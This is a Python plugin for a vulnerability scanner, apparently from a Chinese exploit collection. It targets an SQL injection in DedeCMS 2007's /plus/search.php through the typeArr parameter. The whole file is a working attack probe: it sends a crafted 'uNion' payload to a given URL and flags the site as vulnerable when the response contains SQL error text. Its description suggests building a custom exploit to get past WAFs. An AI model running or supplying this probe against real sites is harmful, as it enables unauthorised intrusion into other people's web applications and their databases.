#!/usr/bin/env python
# -*- coding: utf-8 -*-

from script.lib import logger
from script.lib import requests

author = "SpongeB0B"
scope = "Dedecms 2007"
description = "/plus/search.php typeArr存在SQL注入，由于有的waf会拦截自行构造EXP"
reference = "http://0daysec.blog.51cto.com/9327043/1571372"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def exploit(url):
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
	}
	payload = "/plus/search.php?keyword=test&typeArr[%20uNion%20]=a"
	vulnurl = url + payload
	try:
		req = requests.get(vulnurl, headers=headers, timeout=10)
		req.close()
		if r"Error infos" in req.content and r"Error sql" in req.content:
			logger.success("[+]存在dedecms search.php SQL注入漏洞...(高危)\tpayload: "+vulnurl)
			return vulnurl
	except:
		logger.error("[-] "+vulnurl+"====>连接超时")
		pass
